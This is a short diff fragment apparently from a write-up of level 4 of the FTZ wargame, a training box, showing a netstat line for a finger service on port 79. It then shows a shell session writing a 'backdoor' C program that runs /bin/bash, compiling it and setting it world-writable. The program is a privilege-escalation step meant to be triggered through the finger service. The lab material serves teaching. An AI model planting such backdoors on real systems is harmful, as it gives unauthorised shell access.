@@ -68,4 +68,20 @@ cfinger         2003/tcp                        # GNU Finger
 tcp        0      0 0.0.0.0:79              0.0.0.0:*               LISTEN
 ```
 
+```
+[level4@ftz level4]$ ls -l /home/level4/tmp/backdoor
+ls: /home/level4/tmp/backdoor: No such file or directory
+```
 
+```
+[level4@ftz tmp]$ cat backdoor.c
+#include <stdlib.h>
+
+int main()
+{
+        system("/bin/bash");
+        return 0;
+}
+[level4@ftz tmp]$ gcc -o backdoor backdoor.c
+[level4@ftz tmp]$ chmod 777 backdoor
+```
